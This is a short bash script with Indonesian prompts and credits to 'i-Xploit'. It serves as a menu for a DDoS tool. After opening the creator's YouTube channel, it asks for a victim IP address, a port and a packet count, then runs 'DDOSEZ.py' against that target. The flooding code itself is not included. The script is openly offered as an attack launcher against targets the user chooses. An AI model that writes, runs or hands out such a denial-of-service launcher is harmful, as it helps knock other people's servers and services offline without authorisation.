#
#
clear
echo -e "CODED BY :"
xdg-open https://youtube.com/channel/UCs-HYlgurVWTMobpOPXxiKg
#
#
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
echo -e $red"    ██     ▄▄▄  ▄▄▄            ▄▄▄▄                   ██       ██"
echo -e $red"    ▀▀      ██▄▄██             ▀▀██                   ▀▀       ██"
echo -e $red"  ████       ████    ██▄███▄     ██       ▄████▄    ████     ███████"
echo -e $red"    ██        ██     ██▀  ▀██    ██      ██▀  ▀██     ██       ██"
echo -e $white"    ██       ████    ██    ██    ██      ██    ██     ██       ██"
echo -e $white" ▄▄▄██▄▄▄   ██  ██   ███▄▄██▀    ██▄▄▄   ▀██▄▄██▀  ▄▄▄██▄▄▄    ██▄▄▄"
echo -e $white" ▀▀▀▀▀▀▀▀  ▀▀▀  ▀▀▀  ██ ▀▀▀       ▀▀▀▀     ▀▀▀▀    ▀▀▀▀▀▀▀▀     ▀▀▀▀"
echo -e $white"                     ██"
echo
echo
echo
echo -e $red "########################################"
echo -e $red "# CREATOR: i-Xploit                    #"
echo -e $red "# Yt: Ramdom Toturial                  #"
echo -e $white "#jangan recrod script ini            #"
echo -e $white"#Github :https://github.com/iXploitID #"
echo -e $white "######################################"
echo
echo
echo
echo -e $blue"▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
echo -e "1.LANJUT KE TOOLS INSTALER NYA"
echo -e $blue"▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
echo -e "2.Cek yt creator"
echo -e $blue"▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
echo
echo
read -p "[masukan pilhan]>" act;
read -p "[masukan IP korban]> " a;
echo -e "############################"
echo -e "#Jumlah prot MAXSIMUM 8080 #"
echo -e "############################"
read -p "[masukan Jumlah Prot]> " b;
read -p "[masukan Jumlah Packet ]> " c;

if [ $act = 2 ] || [ $act = 2 ]   
then
xdg-open https://youtube.com/channel/UCs-HYlgurVWTMobpOPXxiKg
clear
fi

if [ $act = 1 ] || [ $act = 1 ]
then
python2 DDOSEZ.py $a $b $c 
fi
